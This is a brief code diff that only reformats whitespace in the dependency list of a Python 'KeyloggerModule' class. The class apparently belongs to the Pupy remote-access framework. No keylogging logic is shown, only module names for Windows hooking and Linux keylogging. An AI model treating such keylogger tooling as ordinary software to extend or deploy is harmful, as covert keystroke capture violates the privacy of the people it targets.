@@ -13,8 +13,8 @@ class KeyloggerModule(PupyModule):
 
     unique_instance = True
     dependencies = {
-        'windows': [ 'pupwinutils.keylogger', 'pupwinutils.hookfuncs' ],
-        'linux': [ 'keylogger' ],
+        'windows': ['pupwinutils.keylogger', 'pupwinutils.hookfuncs'],
+        'linux': ['keylogger'],
     }
 
     @classmethod
